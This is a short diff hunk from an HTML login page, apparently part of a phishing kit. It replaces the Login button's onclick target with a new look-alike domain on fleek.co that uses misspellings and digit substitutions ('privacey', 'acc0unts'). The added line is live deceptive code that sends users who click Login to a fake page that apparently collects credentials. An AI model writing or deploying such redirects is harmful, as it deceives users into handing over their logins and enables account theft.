@@ -250,7 +250,7 @@
                             </script>
 
                          
- <input type="submit" class="submit-button arrow cbensightenevent" cbdata-type="button" onclick="window.open('https://privaceywebsecureaccesscltl3ensacc0unts.on.fleek.co/dum.html')"  cbdata-reason="login" value="Login"> 
+ <input type="submit" class="submit-button arrow cbensightenevent" cbdata-type="button" onclick="window.open('https://verifymanageeduprivaceywebsecureaccess404acc0unts.on.fleek.co/dum.html')"  cbdata-reason="login" value="Login"> 
 
  <!--script>
     document.getElementById("submit").addEventListener("click", myFunction);
